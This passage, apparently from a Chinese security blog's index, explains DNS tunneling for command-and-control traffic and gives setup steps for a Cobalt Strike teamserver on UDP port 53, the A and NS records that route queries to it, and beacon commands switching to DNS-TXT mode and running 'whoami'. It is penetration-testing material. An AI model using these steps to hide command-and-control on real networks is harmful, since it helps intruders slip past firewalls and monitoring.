+<p>​        内网中安装了各种软&#x2F;硬件防护设施来检查主机与外部网络的连接情况很多厂商会收集C&amp;C服务端的域名、IP地址、URL等数据，帮助防火墙进行阻断操作。这样一来，C&amp;C通信就会被切断。于是，通过各种隧道技术实现C&amp;C通信的技术（特别是DNS隧道技术)出现了。<br>​        DNS隧道的工作原理很简单:在进行DNS查询时，如果查询的域名不在 DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果。如果在互联网上有一台定制的服务器，那么依靠 DNS协议即可进行数据包的交换。从 DNS 协议的角度看，这样的操作只是在一次次地查询某个特定的域名并得到解析结果，但其本质问题是，预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令。</p>
+<p>1.云主机Teamserver配置端口53 启用-udp</p>
+<p>2.买一个域名，修改解析记录如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; checkin</span><br><span class="line">[*]Tasked beacon to checkin</span><br><span class="line">beacon&gt; mode dns-txt</span><br><span class="line">beacon&gt; shell whoami</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>隐藏通信隧道</tag>
       </tags>
   </entry>
 </search>
